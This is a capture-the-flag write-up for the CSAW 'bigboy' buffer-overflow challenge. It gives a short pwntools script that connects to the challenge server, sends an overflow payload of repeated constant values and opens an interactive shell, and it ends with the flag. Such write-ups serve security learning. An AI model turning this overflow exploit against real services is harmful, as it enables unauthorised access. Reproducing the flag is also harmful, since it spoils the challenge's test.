# **bigboy**

#### tag : pwn, bof

-----------------------------------------------

#### Description

>Only big boi pwners will get this one!
>
>nc pwn.chal.csaw.io 9000

-----------------------------------------------

#### Solution

```python

from pwn import *

### DEBUGGING ###

DEBUG = False

if DEBUG:
    r = process('boi')
    timeout = 0.1

    context.log_level = 'debug'
#    gdb.attach(r,'''
#    b main
#    ''')
else :
    r = remote('pwn.chal.csaw.io',9000)
    timeout = 0.3

def rr(s):
    return r.recvuntil(s)

def ss(s):
    return r.sendline(s)

### ADDRESS ###

### PAYLOAD ###

payload = p64(0xcaf3baeecaf3baee)*3

### EXPLOIT ###

rr('??')
ss(payload)

r.interactive()
```


**flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}**
